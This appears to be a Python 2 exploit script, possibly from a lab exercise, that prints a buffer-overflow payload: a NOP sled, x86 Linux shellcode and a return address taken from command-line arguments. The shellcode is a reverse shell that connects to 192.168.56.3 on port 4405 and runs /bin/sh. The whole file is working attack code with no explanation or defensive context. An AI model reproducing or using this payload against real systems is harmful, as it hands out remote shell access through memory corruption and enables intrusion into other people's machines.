#!/usr/bin/python2

import sys

var_hb = sys.argv[1]
var_lb = sys.argv[2]

nuid = "005"
padding = "\x90" * 300
shellcode = "\x81\xc4\x54\xf2\xff\xff"
shellcode += "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93"
shellcode += "\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\xc0\xa8\x38\x03"
shellcode += "\x66\x68\x11\x35\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89"
shellcode += "\xe1\x43\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
shellcode += "\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
end_pad = "\x90" * 145
ret_top = "\xff\xff"
ret_hb = chr(int(var_hb))
ret_lb = chr(int(var_lb))
ret = ret_lb + ret_hb + ret_top
payload = ""
payload += nuid
payload += padding
payload += shellcode
payload += end_pad
payload += ret

print(payload)
